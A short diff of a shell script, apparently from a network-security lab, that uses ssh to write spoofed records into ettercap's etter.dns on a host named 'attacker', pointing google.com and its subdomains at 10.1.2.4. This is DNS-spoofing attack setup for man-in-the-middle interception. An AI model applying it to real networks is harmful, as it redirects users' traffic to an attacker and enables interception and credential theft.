@@ -1,8 +1,8 @@
 #!/bin/sh
 
 # Update configuration file
-ssh attacker.facchinetti-dns.offtech "echo \".google.com A 10.1.2.4
-google.com A 10.1.2.4
+ssh attacker.facchinetti-dns.offtech "echo -e \"*.google.com A 10.1.2.4\n
+google.com A 10.1.2.4\n
 www.google.com PTR 10.1.2.4\" | sudo tee -a /etc/ettercap/etter.dns"
 
 ETH=$1
